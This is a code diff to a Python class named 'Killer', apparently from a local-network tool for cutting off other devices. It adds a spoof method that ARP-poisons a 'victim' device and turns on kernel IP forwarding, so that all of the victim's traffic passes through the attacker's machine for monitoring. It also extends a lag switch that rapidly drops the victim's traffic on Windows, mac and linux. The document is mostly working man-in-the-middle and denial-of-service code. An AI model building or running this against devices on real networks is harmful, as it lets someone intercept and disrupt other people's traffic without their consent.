@@ -171,6 +171,24 @@ class Killer:
             self._send_packet(to_router)
             sleep(wait_after)
 
+    def spoof(self, victim: dict[str, object]) -> None:
+        """Route a device's traffic through us — ARP-poison + kernel forwarding —
+        WITHOUT dropping anything.
+
+        This is the base state for monitoring, the lag switch and selective
+        blocks: the device stays online but every packet transits this machine,
+        so those features can act on it. Idempotent; unlike ``kill`` it starts no
+        drop, and unlike a bare poison it enables forwarding so nothing is cut.
+        """
+        with self._lock:
+            new = victim['mac'] not in self.killed
+            self.killed[victim['mac']] = victim
+        if new:
+            self._poison(victim)
+        # Forward the (un-dropped) traffic at kernel speed so the routed device
+        # keeps its connection (sysctl on mac/linux, IPEnableRouter on Windows).
+        enable_ip_forwarding()
+
     @threaded
     def unkill(self, victim: dict[str, object]) -> None:
         """
@@ -435,19 +453,23 @@ class Killer:
                 log.debug('Selective stop error (ignoring): %s', e)
 
     def lag(self, victim: dict[str, object], on: bool) -> None:
-        """Lag switch: toggle a full kernel drop of a poisoned victim on/off.
+        """Lag switch: toggle a full kernel drop of a (spoofed) victim on/off.
 
-        The GUI flips this rapidly to induce latency/packet loss. On Windows it
-        drops all of the victim's forwarded traffic while ``on`` (both directions)
-        and releases it while ``off``, at kernel level.
+        The GUI flips this rapidly to induce latency/packet loss. The victim must
+        already be routed through us (``spoof``); this only toggles the drop of
+        its forwarded traffic — WinDivert on Windows, pf/nft on mac/linux.
         """
-        if not sys.platform.startswith('win'):
-            return
+        ip = str(victim['ip'])
         if on:
-            self._enforce_windivert_block(
-                victim['ip'], drop_from_victim=True, drop_to_victim=True)
+            if sys.platform.startswith('win'):
+                self._enforce_windivert_block(ip, drop_from_victim=True, drop_to_victim=True)
+            else:
+                self._enforce_pf_block(ip)
         else:
-            self._remove_windivert_block(victim['ip'])
+            if sys.platform.startswith('win'):
+                self._remove_windivert_block(ip)
+            else:
+                self._remove_pf_block(ip)
 
     def _enforce_pf_block(self, victim_ip: str) -> None:
         if victim_ip in self.pf_blocks:
